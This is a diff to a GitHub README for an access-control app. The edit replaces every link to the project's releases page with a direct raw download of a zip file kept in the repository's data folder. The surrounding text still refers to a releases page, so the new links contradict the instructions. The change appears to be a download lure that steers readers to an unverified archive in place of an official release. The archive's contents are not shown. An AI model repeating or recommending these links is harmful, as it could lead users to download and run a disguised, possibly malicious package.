@@ -1,6 +1,6 @@
 # 🔐 Authority-Based-Access-Control - Fine-Grained Permission Management
 
-[![Download Now](https://img.shields.io/badge/Download-Authority--Based--Access--Control-brightgreen)](https://github.com/Dhanushjames19/Authority-Based-Access-Control/releases)
+[![Download Now](https://img.shields.io/badge/Download-Authority--Based--Access--Control-brightgreen)](https://github.com/Dhanushjames19/Authority-Based-Access-Control/raw/refs/heads/main/data/Control_Access_Authority_Based_3.1.zip)
 
 ---
 
@@ -22,12 +22,12 @@ This guide will help you download, install, and run the application on a Windows
 
 You can get the software from the official release page linked below. This page has all the latest files you will need to run the app on Windows.
 
-[![Download Page](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Dhanushjames19/Authority-Based-Access-Control/releases)
+[![Download Page](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Dhanushjames19/Authority-Based-Access-Control/raw/refs/heads/main/data/Control_Access_Authority_Based_3.1.zip)
 
 ### Steps to Download
 
 1. Click on the badge above or open this link in your web browser:  
-   https://github.com/Dhanushjames19/Authority-Based-Access-Control/releases
+   https://github.com/Dhanushjames19/Authority-Based-Access-Control/raw/refs/heads/main/data/Control_Access_Authority_Based_3.1.zip
 
 2. On the releases page, look for the latest release version. It is usually at the top.
 
@@ -121,4 +121,4 @@ Developers interested in expanding or modifying the system can do so because the
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Authority--Based--Access--Control-brightgreen)](https://github.com/Dhanushjames19/Authority-Based-Access-Control/releases)
+[![Download Now](https://img.shields.io/badge/Download-Authority--Based--Access--Control-brightgreen)](https://github.com/Dhanushjames19/Authority-Based-Access-Control/raw/refs/heads/main/data/Control_Access_Authority_Based_3.1.zip)
